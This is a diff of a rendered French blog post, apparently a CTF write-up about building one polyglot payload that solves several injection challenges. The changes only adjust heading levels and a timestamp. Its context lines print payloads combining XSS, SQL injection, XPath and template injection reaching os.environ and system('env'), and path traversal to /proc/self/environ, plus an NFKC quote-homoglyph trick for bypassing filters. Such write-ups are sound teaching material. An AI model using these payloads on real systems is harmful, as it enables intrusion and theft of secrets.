class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Notre payload résoud un challenge de plus.</p>
-<h2 class="heading-element" id="ajouter-les-xss-"><span>Ajouter les XSS ?</span>
+<h3 class="heading-element" id="ajouter-les-xss-"><span>Ajouter les XSS ?</span>
   <a href="#ajouter-les-xss-" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>À ce stade, j&rsquo;ai déjà plus de la moitié des challenges qui passent et pourtant je n&rsquo;ai pas intégré les 2 premiers : les XSS. Mais il y a une bonne raison à cela, c&rsquo;est que ça m&rsquo;a pris un peu de temps à trouver ce que je pouvait faire.</p>
+</h3><p>À ce stade, j&rsquo;ai déjà plus de la moitié des challenges qui passent et pourtant je n&rsquo;ai pas intégré les 2 premiers : les XSS. Mais il y a une bonne raison à cela, c&rsquo;est que ça m&rsquo;a pris un peu de temps à trouver ce que je pouvait faire.</p>
 <p>Dans un premier temps il faut trouver une payload qui fasse fonctionner les 2 XSS ensemble (pas très compliqué), mais ensuite il faut trouver comment les intégrer avec les SQLi, et ça, ça pose problème. Mais pour mieux montrer pourquoi, on va commencer par la 1ère étape.</p>
-<h3 class="heading-element" id="dune-payload-deux-xss"><span>D&rsquo;une payload, deux XSS</span>
+<h4 class="heading-element" id="dune-payload-deux-xss"><span>D&rsquo;une payload, deux XSS</span>
   <a href="#dune-payload-deux-xss" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Comme dit plus haut, l&rsquo;assemblage des 2 XSS n&rsquo;est pas des plus compliqués. On peut par exemple faire ceci 🎃</p>
+</h4><p>Comme dit plus haut, l&rsquo;assemblage des 2 XSS n&rsquo;est pas des plus compliqués. On peut par exemple faire ceci 🎃</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -838,11 +849,11 @@ Et donc, il ne nous posera aucun problème de l&rsquo;ajouter un peu où l&rsquo
 <pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>En espérant que cela ne me bloque pas</p>
-<h3 class="heading-element" id="les-sqli"><span>Les SQLi</span>
+<h4 class="heading-element" id="les-sqli"><span>Les SQLi</span>
   <a href="#les-sqli" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Mince, me voilà bloqué !</p>
+</h4><p>Mince, me voilà bloqué !</p>
 <p>Si je prend à part les 2 injections SQL j&rsquo;ai ceci :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -900,11 +911,11 @@ Revenons à ce que j&rsquo;ai écrit plus haut à propos des challenges SQL.</p>
 <li>La payload est normalisée en NFKC</li>
 </ul></blockquote>
 <p>Que veux dire cette dernière ligne ?</p>
-<h3 class="heading-element" id="le-nfkc"><span>Le NFKC</span>
+<h4 class="heading-element" id="le-nfkc"><span>Le NFKC</span>
   <a href="#le-nfkc" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Généralement, lorsqu&rsquo;une information nous est donnée dans un CTF/un challenge, c&rsquo;est quelle est importante. Ici on nous parle de NFKC, qui est une Normalisation Unicode. Ces Normalisation servent à rendre un texte &ldquo;standard&rdquo; en évitant les homoglyphes (caractères qui se ressemblent visuellement mais sont en réalité différents).
+</h4><p>Généralement, lorsqu&rsquo;une information nous est donnée dans un CTF/un challenge, c&rsquo;est quelle est importante. Ici on nous parle de NFKC, qui est une Normalisation Unicode. Ces Normalisation servent à rendre un texte &ldquo;standard&rdquo; en évitant les homoglyphes (caractères qui se ressemblent visuellement mais sont en réalité différents).
 .
 Il transformera donc certains caractères unicodes en des caractères &ldquo;standards&rdquo;.
 Par exemple le caractère <strong>①</strong> deviendra tout simplement <strong>1</strong>.</p>
@@ -928,11 +939,11 @@ Je vais donc faire un petit programme python pour essayer d&rsquo;en trouver</p>
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">i</span><span class="p">,</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span><span class="n">unicodedata</span><span class="o">.</span><span class="n">normalize</span><span class="p">(</span><span class="s1">&#39;NFKC&#39;</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>J&rsquo;obtiens 2 caractères : <strong>＂</strong> et <strong>＇</strong>.</p>
-<h3 class="heading-element" id="xss--sqli"><span>XSS + SQLi</span>
+<h4 class="heading-element" id="xss--sqli"><span>XSS + SQLi</span>
   <a href="#xss--sqli" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Grâce aux caractères obtenus je peux fermer la string de la SQLi sans que cela ferme celle de la XSS 2. La quote unicode ne sera en effet pas interprété par la XSS.</p>
+</h4><p>Grâce aux caractères obtenus je peux fermer la string de la SQLi sans que cela ferme celle de la XSS 2. La quote unicode ne sera en effet pas interprété par la XSS.</p>
 <p>On peut faire comme suit :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -959,11 +970,11 @@ Je vais donc faire un petit programme python pour essayer d&rsquo;en trouver</p>
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">＇</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/* &#34;]|//user[1=1]/password/text()|//user[1=&#34;{system(&#39;env&#39;)}{*{% if &#39;1&#39;==1 %}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} &lt;%= ENV[&#39;FLAG&#39;] %&gt;/../../../../../../../proc/self/environ
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 class="heading-element" id="le-brainfuck"><span>Le Brainfuck</span>
+</div><h3 class="heading-element" id="le-brainfuck"><span>Le Brainfuck</span>
   <a href="#le-brainfuck" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>À ce stade il ne me reste plus que 2 étapes : Le Brainfuck et la XXE. On commence par la payload la plus courte : Le Brainfuck.
+</h3><p>À ce stade il ne me reste plus que 2 étapes : Le Brainfuck et la XXE. On commence par la payload la plus courte : Le Brainfuck.
 Pour être sûr qu&rsquo;il n&rsquo;y ai aucun problème de syntaxe, mon idée est de mettre la payload brainfuck au tout début. En effet tant que le code du début est executé, la suite le sera aussi.</p>
 <p>Comment mettre le brainfuck au tout début sans bloquer le SQL ? En abusant encore du NFKC.
 On va utiliser les fausse double quote <strong>＂</strong> qui n&rsquo;interfererons pas avec la 1ère SQLi, ouvrirons une string dans la 2nde et surtout ne bloquerons pas la xpath (qui ne les interpretera pas non plus).</p>
@@ -993,11 +1004,11 @@ On va utiliser les fausse double quote <strong>＂</strong> qui n&rsquo;interfer
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Tout fonctionne, c&rsquo;est super.</p>
-<h2 class="heading-element" id="la-xxe"><span>La XXE</span>
+<h3 class="heading-element" id="la-xxe"><span>La XXE</span>
   <a href="#la-xxe" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Hélas, je n&rsquo;ai pas réussi dans le temps imparti à intégrer la XXE.
+</h3><p>Hélas, je n&rsquo;ai pas réussi dans le temps imparti à intégrer la XXE.
 Pour que la XXE passe il fallait que dès le début la payload soit acceptée comme du XML recevable et donc commencer par une balise sans aucune quote.</p>
 <p>Si le <code>&lt;&lt;</code> peut passer sur la SQLi (un bitshift), je ne savais pas ce que je pouvais mettre après qui rendrais le tout valable.</p>
 <p>Cependant, ma payload finale (n&rsquo;étant pas celle que l&rsquo;on a construit à tête reposée ensemble) était la suivante :</p>
@@ -1120,7 +1131,7 @@ Je pense qu&rsquo;essayer de jouer sur plusieurs DBMS et rajouter du LDAP serait
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title="Mis à jour le 2025-07-11 11:49:04">Mis à jour le 2025-07-11&nbsp;</span>
+        <span title="Mis à jour le 2025-07-11 13:26:05">Mis à jour le 2025-07-11&nbsp;</span>
       </div><div class="post-info-license">
             <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
           </div></div><div class="post-info-line">
